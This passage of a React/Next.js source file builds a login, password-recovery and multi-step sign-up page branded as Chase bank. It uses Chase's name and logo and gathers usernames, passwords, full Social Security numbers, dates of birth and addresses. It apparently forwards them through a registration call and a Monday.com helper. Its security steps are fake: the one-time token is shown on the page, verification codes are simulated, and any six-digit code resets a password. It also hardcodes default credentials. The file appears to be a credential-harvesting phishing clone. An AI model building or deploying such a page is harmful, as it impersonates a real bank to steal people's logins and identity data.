"use client"

import type React from "react"
import Image from "next/image"

import { useState, useEffect } from "react"
import {
  Eye,
  EyeOff,
  X,
  ArrowLeft,
  Check,
  Shield,
  CreditCard,
  Building2,
  User,
  Mail,
  Phone,
  Lock,
  AlertCircle,
  ExternalLink,
  HomeIcon,
  Key,
} from "lucide-react"
import { Button } from "@/components/ui/button"
import { Checkbox } from "@/components/ui/checkbox"
import { useToast } from "@/hooks/use-toast"
import { storeMondayItemId } from "@/lib/monday-service"
import { useAuth } from "@/lib/auth-context"
import { useRouter } from "next/navigation"

interface LoginPageProps {
  onLogin: () => void
}

type ModalView =
  | "none"
  | "login"
  | "forgot"
  | "forgot-username"
  | "forgot-password"
  | "signup"
  | "signup-form"
  | "open-account"
  | "account-type"
  | "privacy"
  | "more-options"
  | "token-setup"

interface StoredUser {
  username: string
  password: string
  firstName: string
  lastName: string
  email: string
  phone: string
  createdAt: string
}

export function LoginPage({ onLogin }: LoginPageProps) {
  const [username, setUsername] = useState("")
  const [password, setPassword] = useState("")
  const [showPassword, setShowPassword] = useState(false)
  const [rememberMe, setRememberMe] = useState(true)
  const [useToken, setUseToken] = useState(false)
  const [isLoading, setIsLoading] = useState(false)
  const [error, setError] = useState("")
  const [modalView, setModalView] = useState<ModalView>("signup")
  const { toast } = useToast()
  const { login, register } = useAuth()
  const router = useRouter()

  const [tokenCode, setTokenCode] = useState("")
  const [generatedToken, setGeneratedToken] = useState("")
  const [tokenExpiry, setTokenExpiry] = useState<number>(0)

  // Forgot Password/Username States
  const [recoveryEmail, setRecoveryEmail] = useState("")
  const [recoveryPhone, setRecoveryPhone] = useState("")
  const [recoverySSN, setRecoverySSN] = useState("")
  const [verificationCode, setVerificationCode] = useState("")
  const [showVerification, setShowVerification] = useState(false)
  const [newPassword, setNewPassword] = useState("")
  const [confirmNewPassword, setConfirmNewPassword] = useState("")
  const [recoveryMethod, setRecoveryMethod] = useState<"email" | "phone" | "ssn">("email")

  // Sign Up States
  const [signupData, setSignupData] = useState({
    firstName: "",
    lastName: "",
    email: "",
    phone: "",
    ssn: "",
    dob: "",
    address: "",
    city: "",
    state: "",
    zip: "",
    username: "",
    password: "",
    confirmPassword: "",
    agreeTerms: false,
    agreeElectronic: false,
  })
  const [signupStep, setSignupStep] = useState(1)

  const [storedUsers, setStoredUsers] = useState<StoredUser[]>([])

  // Default valid credentials
  const DEFAULT_USERNAME = "Lin Huang"
  const DEFAULT_PASSWORD = "Lin1122"

  useEffect(() => {
    const savedUsers = localStorage.getItem("chase_users")
    if (savedUsers) {
      setStoredUsers(JSON.parse(savedUsers))
    }

    const rememberedUsername = localStorage.getItem("chase_username")
    if (rememberedUsername) {
      setUsername(rememberedUsername)
    }
  }, [])

  const generateToken = () => {
    const token = Math.floor(100000 + Math.random() * 900000).toString()
    setGeneratedToken(token)
    setTokenExpiry(Date.now() + 60000) // 60 seconds expiry
    return token
  }

  useEffect(() => {
    if (tokenExpiry > 0) {
      const interval = setInterval(() => {
        if (Date.now() > tokenExpiry) {
          setGeneratedToken("")
          setTokenExpiry(0)
          toast({
            title: "Token Expired",
            description: "Please generate a new token.",
            variant: "destructive",
          })
        }
      }, 1000)
      return () => clearInterval(interval)
    }
  }, [tokenExpiry, toast])

  const handleSignIn = async () => {
    setError("")

    if (!username.trim()) {
      setError("Please enter your username")
      return
    }

    if (!password.trim()) {
      setError("Please enter your password")
      return
    }

    if (useToken) {
      if (!tokenCode.trim()) {
        setError("Please enter your security token")
        return
      }
      if (tokenCode !== generatedToken) {
        setError("Invalid security token. Please generate a new one.")
        return
      }
      if (Date.now() > tokenExpiry) {
        setError("Token has expired. Please generate a new one.")
        return
      }
    }

    setIsLoading(true)

    try {
      await login(username, password)

      if (rememberMe) {
        localStorage.setItem("chase_username", username)
      } else {
        localStorage.removeItem("chase_username")
      }

      toast({
        title: "Welcome back!",
        description: "You have successfully signed in to Chase.",
      })

      // Redirect to dashboard
      router.push("/dashboard")
    } catch (err) {
      setError("The username or password you entered is incorrect. Please try again.")
    } finally {
      setIsLoading(false)
    }
  }

  const handleKeyPress = (e: React.KeyboardEvent) => {
    if (e.key === "Enter") {
      handleSignIn()
    }
  }

  const handleForgotSubmit = async () => {
    if (recoveryMethod === "email" && !recoveryEmail.includes("@")) {
      toast({ title: "Invalid Email", description: "Please enter a valid email address.", variant: "destructive" })
      return
    }
    if (recoveryMethod === "phone" && recoveryPhone.length < 10) {
      toast({ title: "Invalid Phone", description: "Please enter a valid phone number.", variant: "destructive" })
      return
    }
    if (recoveryMethod === "ssn" && recoverySSN.length < 4) {
      toast({
        title: "Invalid SSN",
        description: "Please enter the last 4 digits of your SSN.",
        variant: "destructive",
      })
      return
    }

    setIsLoading(true)
    await new Promise((resolve) => setTimeout(resolve, 1500))
    setIsLoading(false)
    setShowVerification(true)
    toast({
      title: "Verification Code Sent",
      description: `A verification code has been sent to your ${recoveryMethod === "email" ? "email" : recoveryMethod === "phone" ? "phone" : "registered contact"}.`,
    })
  }

  const handleVerifyCode = async () => {
    if (verificationCode.length < 6) {
      toast({ title: "Invalid Code", description: "Please enter a valid 6-digit code.", variant: "destructive" })
      return
    }

    setIsLoading(true)
    await new Promise((resolve) => setTimeout(resolve, 1500))
    setIsLoading(false)

    if (modalView === "forgot-username") {
      const matchingUser = storedUsers.find(
        (user) =>
          (recoveryMethod === "email" && user.email === recoveryEmail) ||
          (recoveryMethod === "phone" && user.phone === recoveryPhone),
      )

      const foundUsername = matchingUser ? matchingUser.username : DEFAULT_USERNAME

      toast({
        title: "Username Retrieved",
        description: `Your username is: ${foundUsername}`,
      })
      setModalView("none")
      setUsername(foundUsername)
      resetForgotStates()
    } else if (modalView === "forgot-password") {
      if (!newPassword || newPassword !== confirmNewPassword) {
        toast({ title: "Password Mismatch", description: "Passwords do not match.", variant: "destructive" })
        return
      }
      if (newPassword.length < 8) {
        toast({
          title: "Weak Password",
          description: "Password must be at least 8 characters.",
          variant: "destructive",
        })
        return
      }

      const userIndex = storedUsers.findIndex(
        (user) =>
          (recoveryMethod === "email" && user.email === recoveryEmail) ||
          (recoveryMethod === "phone" && user.phone === recoveryPhone),
      )

      if (userIndex !== -1) {
        const updatedUsers = [...storedUsers]
        updatedUsers[userIndex].password = newPassword
        setStoredUsers(updatedUsers)
        localStorage.setItem("chase_users", JSON.stringify(updatedUsers))
      }

      toast({
        title: "Password Reset Successful",
        description: "Your password has been updated. Please sign in with your new password.",
      })
      setModalView("none")
      resetForgotStates()
    }
  }

  const resetForgotStates = () => {
    setRecoveryEmail("")
    setRecoveryPhone("")
    setRecoverySSN("")
    setVerificationCode("")
    setShowVerification(false)
    setNewPassword("")
    setConfirmNewPassword("")
    setRecoveryMethod("email")
  }

  const handleSignupSubmit = async () => {
    if (signupStep === 1) {
      if (!signupData.firstName?.trim() || !signupData.lastName?.trim() || !signupData.email?.trim() || !signupData.phone?.trim()) {
        toast({
          title: "Missing Information",
          description: "Please fill in all required fields.",
          variant: "destructive",
        })
        return
      }
      // Better email validation
      const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/
      if (!emailRegex.test(signupData.email)) {
        toast({
          title: "Invalid Email",
          description: "Please enter a valid email address.",
          variant: "destructive",
        })
        return
      }
      // Phone number validation (basic 10-digit)
      const phoneDigits = signupData.phone.replace(/\D/g, '')
      if (phoneDigits.length < 10) {
        toast({
          title: "Invalid Phone",
          description: "Please enter a valid phone number (at least 10 digits).",
          variant: "destructive",
        })
        return
      }
      setSignupStep(2)
    } else if (signupStep === 2) {
      if (!signupData.ssn || !signupData.dob || !signupData.address) {
        toast({
          title: "Missing Information",
          description: "Please fill in all required fields.",
          variant: "destructive",
        })
        return
      }
      setSignupStep(3)
    } else if (signupStep === 3) {
      if (!signupData.username || !signupData.password) {
        toast({
          title: "Invalid Credentials",
          description: "Please enter a username and password.",
          variant: "destructive",
        })
        return
      }

      if (signupData.password.length < 8) {
        toast({
          title: "Weak Password",
          description: "Password must be at least 8 characters.",
          variant: "destructive",
        })
        return
      }

      if (signupData.password !== signupData.confirmPassword) {
        toast({
          title: "Password Mismatch",
          description: "Passwords do not match.",
          variant: "destructive",
        })
        return
      }

      if (!signupData.agreeTerms || !signupData.agreeElectronic) {
        toast({
          title: "Agreement Required",
          description: "Please agree to the terms and conditions.",
          variant: "destructive",
        })
        return
      }

      const usernameExists =
        storedUsers.some((user) => user.username === signupData.username) || signupData.username === DEFAULT_USERNAME

      if (usernameExists) {
        toast({
          title: "Username Taken",
          description: "This username is already in use. Please choose another.",
          variant: "destructive",
        })
        return
      }

      setIsLoading(true)

      try {
        await register({
          username: signupData.username,
          email: signupData.email,
          password: signupData.password,
          firstName: signupData.firstName,
          lastName: signupData.lastName,
          phone: signupData.phone,
          ssn: signupData.ssn,
          dateOfBirth: signupData.dob,
          address: signupData.address,
          city: signupData.city,
          state: signupData.state,
          zipCode: signupData.zip,
        })

        toast({
          title: "Account Created Successfully",
          description: "Welcome to Chase! Redirecting to your dashboard...",
        })

        // Reset form and close modal
        setModalView("none")
        setSignupStep(1)
        setSignupData({
          firstName: "",
          lastName: "",
          email: "",
          phone: "",
          ssn: "",
        dob: "",
        address: "",
        city: "",
        state: "",
        zip: "",
        username: "",
        password: "",
        confirmPassword: "",
        agreeTerms: false,
        agreeElectronic: false,
      })

        // Redirect to dashboard
        router.push("/dashboard")
      } catch (err) {
        const errorMsg = err instanceof Error ? err.message : "Registration failed"
        toast({
          title: "Registration Error",
          description: errorMsg,
          variant: "destructive",
        })
      } finally {
        setIsLoading(false)
      }
    }
  }

  const closeModal = () => {
    setModalView("none")
    resetForgotStates()
    setSignupStep(1)
  }

  const renderModal = () => {
    if (modalView === "none") return null

    return (
      <div className="fixed inset-0 bg-black/50 z-50 flex items-end sm:items-center justify-center">
        <div className="bg-white w-full sm:max-w-md sm:rounded-2xl rounded-t-3xl max-h-[90vh] overflow-y-auto animate-in slide-in-from-bottom duration-300">
          {/* Modal Header */}
          <div className="sticky top-0 bg-[#117aca] text-white p-4 flex items-center justify-between sm:rounded-t-2xl">
            <button onClick={closeModal} className="p-1 hover:bg-white/20 rounded-full transition-colors">
              {modalView === "forgot-username" ||
              modalView === "forgot-password" ||
              modalView === "signup-form" ||
              modalView === "account-type" ||
              modalView === "token-setup" ? (
                <ArrowLeft
                  className="w-6 h-6"
                  onClick={(e) => {
                    e.stopPropagation()
                    if (modalView === "forgot-username" || modalView === "forgot-password") {
                      setModalView("forgot")
                      resetForgotStates()
                    } else if (modalView === "signup-form") {
                      if (signupStep > 1) setSignupStep(signupStep - 1)
                      else setModalView("signup")
                    } else if (modalView === "account-type") {
                      setModalView("open-account")
                    } else if (modalView === "token-setup") {
                      setModalView("none")
                    }
                  }}
                />
              ) : (
                <X className="w-6 h-6" />
              )}
            </button>
            <div className="flex items-center gap-2">
              <span className="font-bold text-lg">CHASE</span>
              <Image src="/images/chase-logo.png" alt="Chase" width={28} height={28} className="rounded" />
            </div>
            <div className="w-8"></div>
          </div>

          {/* Token Setup Modal */}
          {modalView === "token-setup" && (
            <div className="p-6">
              <h2 className="text-xl font-bold text-gray-900 mb-2">Security Token</h2>
              <p className="text-gray-600 mb-6">Generate a one-time security token for enhanced protection.</p>

              <div className="bg-blue-50 p-6 rounded-xl mb-6 text-center">
                <Key className="w-12 h-12 text-[#117aca] mx-auto mb-4" />
                {generatedToken ? (
                  <>
                    <p className="text-3xl font-mono font-bold text-[#117aca] tracking-widest mb-2">{generatedToken}</p>
                    <p className="text-sm text-gray-600">
                      Expires in {Math.max(0, Math.ceil((tokenExpiry - Date.now()) / 1000))} seconds
                    </p>
                  </>
                ) : (
                  <p className="text-gray-600">Click the button below to generate a token</p>
                )}
              </div>

              <Button
                onClick={() => {
                  const token = generateToken()
                  toast({
                    title: "Token Generated",
                    description: `Your security token is: ${token}`,
                  })
                }}
                className="w-full bg-[#117aca] hover:bg-[#0a5a9e] py-6 mb-4"
              >
                <Key className="w-4 h-4 mr-2" />
                Generate New Token
              </Button>

              <div className="p-4 bg-gray-50 rounded-xl">
                <div className="flex items-start gap-3">
                  <Shield className="w-5 h-5 text-[#117aca] mt-0.5" />
                  <div>
                    <p className="text-sm font-medium text-gray-900">How to use</p>
                    <p className="text-xs text-gray-600">
                      1. Generate a token above
                      <br />
                      2. Enter it in the "Security Token" field on the login screen
                      <br />
                      3. Sign in within 60 seconds
                    </p>
                  </div>
                </div>
              </div>
            </div>
          )}

          {/* Forgot Password/Username Modal */}
          {modalView === "forgot" && (
            <div className="p-6">
              <h2 className="text-xl font-bold text-gray-900 mb-2">Forgot username or password?</h2>
              <p className="text-gray-600 mb-6">Choose what you need help with:</p>

              <div className="space-y-3">
                <button
                  onClick={() => setModalView("forgot-username")}
                  className="w-full p-4 border-2 border-gray-200 rounded-xl hover:border-[#117aca] hover:bg-blue-50 transition-all flex items-center gap-4"
                >
                  <div className="w-12 h-12 bg-blue-100 rounded-full flex items-center justify-center">
                    <User className="w-6 h-6 text-[#117aca]" />
                  </div>
                  <div className="text-left">
                    <p className="font-semibold text-gray-900">Forgot Username</p>
                    <p className="text-sm text-gray-500">Recover your Chase username</p>
                  </div>
                </button>

                <button
                  onClick={() => setModalView("forgot-password")}
                  className="w-full p-4 border-2 border-gray-200 rounded-xl hover:border-[#117aca] hover:bg-blue-50 transition-all flex items-center gap-4"
                >
                  <div className="w-12 h-12 bg-blue-100 rounded-full flex items-center justify-center">
                    <Lock className="w-6 h-6 text-[#117aca]" />
                  </div>
                  <div className="text-left">
                    <p className="font-semibold text-gray-900">Forgot Password</p>
                    <p className="text-sm text-gray-500">Reset your Chase password</p>
                  </div>
                </button>
              </div>

              <div className="mt-6 p-4 bg-gray-50 rounded-xl">
                <div className="flex items-start gap-3">
                  <Shield className="w-5 h-5 text-[#117aca] mt-0.5" />
                  <div>
                    <p className="text-sm font-medium text-gray-900">Security Tip</p>
                    <p className="text-xs text-gray-600">
                      Chase will never ask for your full password or PIN via email or phone.
                    </p>
                  </div>
                </div>
              </div>
            </div>
          )}

          {/* Forgot Username Form */}
          {modalView === "forgot-username" && (
            <div className="p-6">
              <h2 className="text-xl font-bold text-gray-900 mb-2">Recover Username</h2>
              <p className="text-gray-600 mb-6">Verify your identity to recover your username.</p>

              {!showVerification ? (
                <>
                  <div className="space-y-4 mb-6">
                    <p className="text-sm font-medium text-gray-700">Choose verification method:</p>
                    <div className="grid grid-cols-3 gap-2">
                      {(["email", "phone", "ssn"] as const).map((method) => (
                        <button
                          key={method}
                          onClick={() => setRecoveryMethod(method)}
                          className={`p-3 rounded-lg border-2 transition-all ${
                            recoveryMethod === method
                              ? "border-[#117aca] bg-blue-50"
                              : "border-gray-200 hover:border-gray-300"
                          }`}
                        >
                          {method === "email" && <Mail className="w-5 h-5 mx-auto mb-1 text-[#117aca]" />}
                          {method === "phone" && <Phone className="w-5 h-5 mx-auto mb-1 text-[#117aca]" />}
                          {method === "ssn" && <Shield className="w-5 h-5 mx-auto mb-1 text-[#117aca]" />}
                          <span className="text-xs capitalize">{method === "ssn" ? "SSN" : method}</span>
                        </button>
                      ))}
                    </div>
                  </div>

                  {recoveryMethod === "email" && (
                    <div className="mb-6">
                      <label className="block text-sm font-medium text-gray-700 mb-2">Email Address</label>
                      <input
                        type="email"
                        value={recoveryEmail}
                        onChange={(e) => setRecoveryEmail(e.target.value)}
                        className="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-[#117aca] focus:border-transparent"
                        placeholder="Enter your registered email"
                      />
                    </div>
                  )}

                  {recoveryMethod === "phone" && (
                    <div className="mb-6">
                      <label className="block text-sm font-medium text-gray-700 mb-2">Phone Number</label>
                      <input
                        type="tel"
                        value={recoveryPhone}
                        onChange={(e) => setRecoveryPhone(e.target.value)}
                        className="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-[#117aca] focus:border-transparent"
                        placeholder="Enter your registered phone"
                      />
                    </div>
                  )}

                  {recoveryMethod === "ssn" && (
                    <div className="mb-6">
                      <label className="block text-sm font-medium text-gray-700 mb-2">Last 4 digits of SSN</label>
                      <input
                        type="password"
                        maxLength={4}
                        value={recoverySSN}
                        onChange={(e) => setRecoverySSN(e.target.value.replace(/\D/g, ""))}
                        className="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-[#117aca] focus:border-transparent"
                        placeholder="****"
                      />
                    </div>
                  )}

                  <Button
                    onClick={handleForgotSubmit}
                    disabled={isLoading}
                    className="w-full bg-[#117aca] hover:bg-[#0a5a9e] py-6"
                  >
                    {isLoading ? "Sending..." : "Send Verification Code"}
                  </Button>
                </>
              ) : (
                <>
                  <div className="mb-6">
                    <label className="block text-sm font-medium text-gray-700 mb-2">Verification Code</label>
                    <input
                      type="text"
                      maxLength={6}
                      value={verificationCode}
                      onChange={(e) => setVerificationCode(e.target.value.replace(/\D/g, ""))}
                      className="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-[#117aca] focus:border-transparent text-center text-2xl tracking-widest"
                      placeholder="000000"
                    />
                    <p className="text-xs text-gray-500 mt-2">Enter the 6-digit code sent to your {recoveryMethod}</p>
                  </div>

                  <Button
                    onClick={handleVerifyCode}
                    disabled={isLoading}
                    className="w-full bg-[#117aca] hover:bg-[#0a5a9e] py-6"
                  >
                    {isLoading ? "Verifying..." : "Verify & Recover Username"}
                  </Button>

                  <button
                    onClick={() => {
                      setShowVerification(false)
                      toast({
                        title: "Code Resent",
                        description: `A new verification code has been sent to your ${recoveryMethod}.`,
                      })
                    }}
                    className="w-full mt-3 text-[#117aca] hover:underline text-sm"
                  >
                    Resend Code
                  </button>
                </>
              )}
            </div>
          )}

          {/* Forgot Password Form */}
          {modalView === "forgot-password" && (
            <div className="p-6">
              <h2 className="text-xl font-bold text-gray-900 mb-2">Reset Password</h2>
              <p className="text-gray-600 mb-6">Verify your identity to reset your password.</p>

              {!showVerification ? (
                <>
                  <div className="space-y-4 mb-6">
                    <p className="text-sm font-medium text-gray-700">Choose verification method:</p>
                    <div className="grid grid-cols-3 gap-2">
                      {(["email", "phone", "ssn"] as const).map((method) => (
                        <button
                          key={method}
                          onClick={() => setRecoveryMethod(method)}
                          className={`p-3 rounded-lg border-2 transition-all ${
                            recoveryMethod === method
                              ? "border-[#117aca] bg-blue-50"
                              : "border-gray-200 hover:border-gray-300"
                          }`}
                        >
                          {method === "email" && <Mail className="w-5 h-5 mx-auto mb-1 text-[#117aca]" />}
                          {method === "phone" && <Phone className="w-5 h-5 mx-auto mb-1 text-[#117aca]" />}
                          {method === "ssn" && <Shield className="w-5 h-5 mx-auto mb-1 text-[#117aca]" />}
                          <span className="text-xs capitalize">{method === "ssn" ? "SSN" : method}</span>
                        </button>
                      ))}
                    </div>
                  </div>

                  {recoveryMethod === "email" && (
                    <div className="mb-6">
                      <label className="block text-sm font-medium text-gray-700 mb-2">Email Address</label>
                      <input
                        type="email"
                        value={recoveryEmail}
                        onChange={(e) => setRecoveryEmail(e.target.value)}
                        className="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-[#117aca] focus:border-transparent"
                        placeholder="Enter your registered email"
                      />
                    </div>
                  )}

                  {recoveryMethod === "phone" && (
                    <div className="mb-6">
                      <label className="block text-sm font-medium text-gray-700 mb-2">Phone Number</label>
                      <input
                        type="tel"
                        value={recoveryPhone}
                        onChange={(e) => setRecoveryPhone(e.target.value)}
                        className="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-[#117aca] focus:border-transparent"
                        placeholder="Enter your registered phone"
                      />
                    </div>
                  )}

                  {recoveryMethod === "ssn" && (
                    <div className="mb-6">
                      <label className="block text-sm font-medium text-gray-700 mb-2">Last 4 digits of SSN</label>
                      <input
                        type="password"
                        maxLength={4}
                        value={recoverySSN}
                        onChange={(e) => setRecoverySSN(e.target.value.replace(/\D/g, ""))}
                        className="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-[#117aca] focus:border-transparent"
                        placeholder="****"
                      />
                    </div>
                  )}

                  <Button
                    onClick={handleForgotSubmit}
                    disabled={isLoading}
                    className="w-full bg-[#117aca] hover:bg-[#0a5a9e] py-6"
                  >
                    {isLoading ? "Sending..." : "Send Verification Code"}
                  </Button>
                </>
              ) : (
                <>
                  <div className="mb-4">
                    <label className="block text-sm font-medium text-gray-700 mb-2">Verification Code</label>
                    <input
                      type="text"
                      maxLength={6}
                      value={verificationCode}
                      onChange={(e) => setVerificationCode(e.target.value.replace(/\D/g, ""))}
                      className="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-[#117aca] focus:border-transparent text-center text-2xl tracking-widest"
                      placeholder="000000"
                    />
                  </div>

                  <div className="mb-4">
                    <label className="block text-sm font-medium text-gray-700 mb-2">New Password</label>
                    <input
                      type="password"
                      value={newPassword}
                      onChange={(e) => setNewPassword(e.target.value)}
                      className="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-[#117aca] focus:border-transparent"
                      placeholder="Enter new password"
                    />
                  </div>

                  <div className="mb-6">
                    <label className="block text-sm font-medium text-gray-700 mb-2">Confirm New Password</label>
                    <input
                      type="password"
                      value={confirmNewPassword}
                      onChange={(e) => setConfirmNewPassword(e.target.value)}
                      className="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-[#117aca] focus:border-transparent"
                      placeholder="Confirm new password"
                    />
                  </div>

                  <div className="mb-6 p-3 bg-gray-50 rounded-lg">
                    <p className="text-xs text-gray-600 mb-2">Password requirements:</p>
                    <ul className="text-xs text-gray-500 space-y-1">
                      <li className={newPassword.length >= 8 ? "text-green-600" : ""}>
                        {newPassword.length >= 8 ? "✓" : "○"} At least 8 characters
                      </li>
                      <li className={/[A-Z]/.test(newPassword) ? "text-green-600" : ""}>
                        {/[A-Z]/.test(newPassword) ? "✓" : "○"} One uppercase letter
                      </li>
                      <li className={/[a-z]/.test(newPassword) ? "text-green-600" : ""}>
                        {/[a-z]/.test(newPassword) ? "✓" : "○"} One lowercase letter
                      </li>
                      <li className={/\d/.test(newPassword) ? "text-green-600" : ""}>
                        {/\d/.test(newPassword) ? "✓" : "○"} One number
                      </li>
                    </ul>
                  </div>

                  <Button
                    onClick={handleVerifyCode}
                    disabled={isLoading}
                    className="w-full bg-[#117aca] hover:bg-[#0a5a9e] py-6"
                  >
                    {isLoading ? "Resetting..." : "Reset Password"}
                  </Button>
                </>
              )}
            </div>
          )}

          {/* Sign Up Modal */}
          {modalView === "signup" && (
            <div className="p-6">
              <h2 className="text-xl font-bold text-gray-900 mb-2">Sign up for Chase Online</h2>
              <p className="text-gray-600 mb-6">Access your accounts anytime, anywhere.</p>

              <div className="space-y-4">
                <button
                  onClick={() => setModalView("signup-form")}
                  className="w-full p-4 border-2 border-gray-200 rounded-xl hover:border-[#117aca] hover:bg-blue-50 transition-all flex items-center gap-4"
                >
                  <div className="w-12 h-12 bg-blue-100 rounded-full flex items-center justify-center">
                    <CreditCard className="w-6 h-6 text-[#117aca]" />
                  </div>
                  <div className="text-left flex-1">
                    <p className="font-semibold text-gray-900">I have a Chase account</p>
                    <p className="text-sm text-gray-500">Sign up for online access to your existing account</p>
                  </div>
                </button>

                <button
                  onClick={() => setModalView("open-account")}
                  className="w-full p-4 border-2 border-gray-200 rounded-xl hover:border-[#117aca] hover:bg-blue-50 transition-all flex items-center gap-4"
                >
                  <div className="w-12 h-12 bg-green-100 rounded-full flex items-center justify-center">
                    <Building2 className="w-6 h-6 text-green-600" />
                  </div>
                  <div className="text-left flex-1">
                    <p className="font-semibold text-gray-900">I'm new to Chase</p>
                    <p className="text-sm text-gray-500">Open a new Chase account today</p>
                  </div>
                </button>
              </div>

              <div className="mt-6 p-4 bg-blue-50 rounded-xl">
                <h3 className="font-semibold text-gray-900 mb-2">Benefits of Chase Online</h3>
                <ul className="text-sm text-gray-600 space-y-2">
                  <li className="flex items-center gap-2">
                    <Check className="w-4 h-4 text-green-600" /> 24/7 account access
                  </li>
                  <li className="flex items-center gap-2">
                    <Check className="w-4 h-4 text-green-600" /> Free bill pay
                  </li>
                  <li className="flex items-center gap-2">
                    <Check className="w-4 h-4 text-green-600" /> Mobile check deposit
                  </li>
                  <li className="flex items-center gap-2">
                    <Check className="w-4 h-4 text-green-600" /> Real-time alerts
                  </li>
                </ul>
              </div>

              <div className="mt-6 text-center">
                <p className="text-gray-600 text-sm mb-2">Already have online access?</p>
                <button
                  onClick={() => setModalView("login")}
                  className="text-[#117aca] hover:underline font-medium text-sm"
                >
                  Sign in to your account
                </button>
              </div>
            </div>
          )}

          {/* Login Form - shown when user wants to sign in */}
          {modalView === "login" && (
            <div className="p-6">
              <button
                onClick={() => setModalView("signup")}
                className="flex items-center gap-2 text-[#117aca] hover:underline mb-4"
              >
                <ArrowLeft className="w-4 h-4" />
                Back to signup options
              </button>
              
              <h2 className="text-2xl font-bold text-gray-900 mb-1">Sign in</h2>
              <p className="text-gray-600 mb-6">Access your Chase accounts</p>

              {error && (
                <div className="mb-4 p-4 bg-red-50 border border-red-200 rounded-lg flex gap-3">
                  <AlertCircle className="w-5 h-5 text-red-600 flex-shrink-0 mt-0.5" />
                  <p className="text-sm text-red-700">{error}</p>
                </div>
              )}

              <div className="mb-6">
                <label className="block text-sm font-medium text-gray-700 mb-2">Username or User ID *</label>
                <div className="relative">
                  <input
                    type="text"
                    value={username}
                    onChange={(e) => {
                      setUsername(e.target.value)
                      setError("")
                    }}
                    onKeyPress={(e) => {
                      if (e.key === "Enter" && !isLoading) handleSignIn()
                    }}
                    className="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-[#117aca] focus:border-transparent pr-10"
                    placeholder="example@chase.com"
                  />
                  <User className="absolute right-3 top-1/2 -translate-y-1/2 w-5 h-5 text-gray-400" />
                </div>
              </div>

              <div className="mb-6">
                <label className="block text-sm font-medium text-gray-700 mb-2">Password *</label>
                <div className="relative">
                  <input
                    type={showPassword ? "text" : "password"}
                    value={password}
                    onChange={(e) => {
                      setPassword(e.target.value)
                      setError("")
                    }}
                    onKeyPress={(e) => {
                      if (e.key === "Enter" && !isLoading) handleSignIn()
                    }}
                    className="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-[#117aca] focus:border-transparent pr-10"
                    placeholder="••••••••"
                  />
                  <button
                    type="button"
                    onClick={() => setShowPassword(!showPassword)}
                    className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-500 hover:text-gray-700"
                  >
                    {showPassword ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
                  </button>
                </div>
              </div>

              <div className="flex items-center justify-between mb-6">
                <div className="flex items-center gap-2">
                  <Checkbox
                    id="remember"
                    checked={rememberMe}
                    onCheckedChange={(checked) => setRememberMe(checked as boolean)}
                    className="border-[#117aca] data-[state=checked]:bg-[#117aca] data-[state=checked]:border-[#117aca]"
                  />
                  <label htmlFor="remember" className="text-sm text-gray-600 cursor-pointer">
                    Remember me
                  </label>
                </div>
                <button
                  onClick={() => setModalView("forgot")}
                  className="text-sm text-[#117aca] hover:underline"
                >
                  Forgot username or password?
                </button>
              </div>

              <Button
                onClick={handleSignIn}
                disabled={isLoading}
                className="w-full bg-[#117aca] hover:bg-[#0a5a9e] py-6 text-base"
              >
                {isLoading ? "Signing in..." : "Sign in"}
              </Button>

              <div className="mt-4 text-center">
                <p className="text-gray-600 text-sm">Don&apos;t have online access?</p>
                <button
                  onClick={() => setModalView("signup")}
                  className="text-[#117aca] hover:underline font-medium text-sm mt-1"
                >
                  Sign up now
                </button>
              </div>
            </div>
          )}

          {/* Sign Up Form */}
          {modalView === "signup-form" && (
            <div className="p-6">
              <div className="flex items-center gap-2 mb-4">
                {[1, 2, 3].map((step) => (
                  <div key={step} className="flex items-center">
                    <div
                      className={`w-8 h-8 rounded-full flex items-center justify-center text-sm font-medium ${
                        signupStep >= step ? "bg-[#117aca] text-white" : "bg-gray-200 text-gray-500"
                      }`}
                    >
                      {signupStep > step ? <Check className="w-4 h-4" /> : step}
                    </div>
                    {step < 3 && <div className={`w-8 h-1 ${signupStep > step ? "bg-[#117aca]" : "bg-gray-200"}`} />}
                  </div>
                ))}
              </div>

              {signupStep === 1 && (
                <>
                  <h2 className="text-xl font-bold text-gray-900 mb-4">Personal Information</h2>
                  <div className="space-y-4">
                    <div className="grid grid-cols-2 gap-3">
                      <div>
                        <label className="block text-sm font-medium text-gray-700 mb-1">First Name *</label>
                        <input
                          type="text"
                          value={signupData.firstName}
                          onChange={(e) => setSignupData({ ...signupData, firstName: e.target.value })}
                          className="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-[#117aca]"
                        />
                      </div>
                      <div>
                        <label className="block text-sm font-medium text-gray-700 mb-1">Last Name *</label>
                        <input
                          type="text"
                          value={signupData.lastName}
                          onChange={(e) => setSignupData({ ...signupData, lastName: e.target.value })}
                          className="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-[#117aca]"
                        />
                      </div>
                    </div>
                    <div>
                      <label className="block text-sm font-medium text-gray-700 mb-1">Email Address *</label>
                      <input
                        type="email"
                        value={signupData.email}
                        onChange={(e) => setSignupData({ ...signupData, email: e.target.value })}
                        className="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-[#117aca]"
                      />
                    </div>
                    <div>
                      <label className="block text-sm font-medium text-gray-700 mb-1">Phone Number *</label>
                      <input
                        type="tel"
                        value={signupData.phone}
                        onChange={(e) => setSignupData({ ...signupData, phone: e.target.value })}
                        className="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-[#117aca]"
                      />
                    </div>
                  </div>
                </>
              )}

              {signupStep === 2 && (
                <>
                  <h2 className="text-xl font-bold text-gray-900 mb-4">Identity Verification</h2>
